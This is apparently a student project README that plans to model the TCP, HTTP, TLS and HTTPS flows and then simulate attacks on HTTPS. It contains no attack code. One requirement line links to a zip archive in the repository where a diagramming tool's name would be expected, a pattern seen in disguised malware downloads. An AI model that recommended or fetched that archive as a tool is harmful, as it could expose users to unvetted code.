# Definition of the project
This is a security project that aims at simulating the flow of ``HTTPS`` and tries to attack it
using popular vulnerability

# Project Requirements 

https://raw.githubusercontent.com/youssefjmal/HTTPS/main/docs/tcp/HTTPS-3.5.zip to draw the sequence diagrams/automata 
latex for rapport pdf (we will use md for now)
uppal or I don't know the name of it but for simulation 

# File Structure

# Naming Convention
it will be in sprat file but for now here the naming convention we will follow 

const: UPPER_SNAKE_CASE
file : snake_case with the topic is first for example : ``tcp_sync``

# Epics

1. [x] TCP
    - what is tcp
    - sequence diagram and the flow of TCP
    - automata

2. [] HTTP
    - what is HTTP
    - sequence diagram and the flow of HTTP
    - automata

3. [] SSL/TLS
    - what is TLS
    - sequence diagram and the flow of TLS
    - automata

4. [] HTTPS
    - what is HTTPS
    - sequence diagram and the flow of HTTPS
    - automata
5. [] ATTACKS
    - popular attack on HTTPS (we can target TCP & TLS)
    - simulating and see where we get blocked

**ecah step will have it own theory and automata and  at the last step will make the full HTTPS
flow in the 4th epic  and we will speak about  attacks in each step**

**for reference we will use RFC**
